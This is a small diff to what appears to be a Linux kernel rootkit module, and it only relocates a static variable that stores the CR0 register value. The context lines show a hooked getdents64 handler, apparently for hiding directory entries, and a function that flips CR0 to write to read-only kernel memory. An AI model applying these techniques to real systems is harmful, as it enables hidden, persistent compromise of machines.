@@ -32,8 +32,6 @@ MODULE_DESCRIPTION("yeth plz");
 MODULE_VERSION("1.0");
 MODULE_ALIAS("kthnxbye");
 
-/* This is the original value of CR0 */
-static unsigned original_cr0;
 
 ////////////////////////////////////////////////////////////////////////////////
 /* CHAR DEVICE */
@@ -188,6 +186,9 @@ asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 __user 
 }
 
 ////////////////////////////////////////////////////////////////////////////////
+/* This is the original value of CR0 */
+static unsigned original_cr0;
+
 /**
  * cr0_enable_write() -
  *  Twiddles CR0 to enable writing to read-only memory
